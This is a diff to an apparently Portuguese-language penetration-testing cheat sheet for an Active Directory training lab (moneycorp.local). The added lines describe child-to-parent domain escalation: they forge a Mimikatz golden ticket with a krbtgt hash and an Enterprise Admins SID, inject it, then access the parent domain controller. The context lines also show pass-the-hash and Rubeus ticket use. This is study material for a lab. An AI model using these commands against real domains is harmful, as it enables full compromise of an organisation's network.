@@ -3049,6 +3049,7 @@ Privilege::debug
 sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe
 ```
 ##### MIMIKATZ - MIMIKATZ VIA PSREMOTING
+Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.
 ```
 $MYSESSION = New-PSSession -computername dcorp-dc
 Enter-PSSession $MYSESSION
@@ -3112,4 +3113,23 @@ ou
 ```
 .\Rubeus.exe ptt /ticket:CIFS.mcorp-dc.moneycorp.local.kirbi
 ```
+##### MIMIKATZ - TRUST INTER DOMAIN USING DOMAIN ADMIN(KRBTGT)
+Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
 
+1. GERAR GOLDEN TICKET PARA ADMINSTRATOR
+```
+Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:c:\krbtgt_tkt.kirbi
+```
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:c:\krbtgt_tkt.kirbi"'
+```
+2. INJECTAR O TICKET
+```
+kerberos::ptt c:\krbtgt_tkt.kirbi
+```
+3. TESTAR COMANDOS REMOTAMENTE
+```
+dir \\mcorp-dc.moneycorp.local\c$
+Get-WmiObject -class win32_operatingsystem -computername mcorp-dc.moneycorp.local
+```
+	
